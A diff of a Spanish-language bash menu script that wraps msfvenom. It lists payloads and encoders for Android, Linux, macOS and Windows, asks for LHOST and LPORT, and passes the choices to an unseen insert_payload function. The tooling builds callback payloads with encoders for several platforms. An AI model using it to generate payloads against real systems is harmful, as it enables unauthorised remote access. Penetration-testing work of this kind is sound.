@@ -64,72 +64,6 @@ check_mariadb
 
 create_database
 
-os=""
-payloads=""
-encoders=""
-
-usage() {
-    echo "Uso: sudo ./Generación_de_payload.sh -o <os> [-p <ruta>] [--help]"
-    echo "    -o <os>: Android, Linux, macOS o Windows"
-    echo "    -p <ruta>: Ruta personalizada (opcional)"
-    echo "    --help: Mostrar esta ayuda"
-    exit 1
-}
-
-if [ "$1" == "--help" ]; then
-    usage
-fi
-
-while getopts "o:p:" opt; do
-    case ${opt} in
-        o)
-            os=$OPTARG
-            ;;
-        p)
-            custom_path=$OPTARG
-            ;;
-        *)
-            usage
-            ;;
-    esac
-done
-
-shift $((OPTIND - 1))
-
-if [ -z "$os" ]; then
-    usage
-fi
-
-case "$os" in
-    Android)
-        payloads=$(msfvenom --list payloads | grep -E "android/" | awk '{print NR, $1}')
-        encoders=$(msfvenom --list encoders | awk '{print NR, $1}')
-        ;;
-    Linux)
-        payloads=$(msfvenom --list payloads | grep -E "linux/" | awk '{print NR, $1}')
-        encoders=$(msfvenom --list encoders | awk '{print NR, $1}')
-        ;;
-    macOS)
-        payloads=$(msfvenom --list payloads | grep -E "osx/" | awk '{print NR, $1}')
-        encoders=$(msfvenom --list encoders | awk '{print NR, $1}')
-        ;;
-    Windows)
-        payloads=$(msfvenom --list payloads | grep -E "windows/" | awk '{print NR, $1}')
-        encoders=$(msfvenom --list encoders | awk '{print NR, $1}')
-        ;;
-    *)
-        usage
-        ;;
-esac
-
-if [ -z "$custom_path" ]; then
-    path=$default_path/$os
-else
-    path=$custom_path/$os
-fi
-
-mkdir -p "$path"
-
 while true; do
     echo
     echo "Menú"
@@ -147,24 +81,74 @@ while true; do
             ;;
         2)
             echo
+            echo "Selecciona la plataforma:"
+            echo "========================"
+            echo "1. Android"
+            echo "2. Linux"
+            echo "3. macOS"
+            echo "4. Windows"
+            echo
+
+            read -p "Selecciona el número de plataforma: " platform_number
+
+            case $platform_number in
+                1)
+                    os="Android"
+                    default_format="apk"
+                    ;;
+                2)
+                    os="Linux"
+                    default_format="elf"
+                    ;;
+                3)
+                    os="macOS"
+                    default_format="macho"
+                    ;;
+                4)
+                    os="Windows"
+                    default_format="exe"
+                    ;;
+                *)
+                    echo "Plataforma inválida. Por favor, selecciona una opción válida."
+                    continue
+                    ;;
+            esac
+
+            payloads=$(msfvenom --list payloads | grep -E "${os,,}/" | awk '{print NR, $1}')
+
+            if [ -z "$payloads" ]; then
+                echo "No hay payloads disponibles para $os."
+                continue
+            fi
+
+            echo
             echo "Payloads disponibles para $os:"
-            echo "============================="
+            echo "=============================="
             echo "$payloads"
             echo
 
             read -p "Selecciona el número de payload: " payload_number
+
             selected_payload=$(echo "$payloads" | awk -v num=$payload_number 'NR==num{print $2}')
 
             read -p "LHOST: " lhost
             read -p "LPORT: " lport
 
+            encoders=$(msfvenom --list encoders | awk '{print NR, $0}')
+
+            if [ -z "$encoders" ]; then
+                echo "No hay encoders disponibles."
+                continue
+            fi
+
             echo
             echo "Encoders disponibles:"
-            echo "===================="
+            echo "====================="
             echo "$encoders"
             echo
 
             read -p "Selecciona el número de encoder: " encoder_number
+
             selected_encoder=$(echo "$encoders" | awk -v num=$encoder_number 'NR==num{print $2}')
 
             read -p "Nombre del archivo (sin extensión): " file
@@ -174,6 +158,14 @@ while true; do
             fi
 
             file_with_extension="$file.$default_format"
+
+            if [ -z "$custom_path" ]; then
+                path=$default_path/$os
+            else
+                path=$custom_path/$os
+            fi
+
+            mkdir -p "$path"
 
             insert_payload "$selected_payload" "$lhost" "$lport" "$selected_encoder" "$file_with_extension" "$path/$file_with_extension"
 
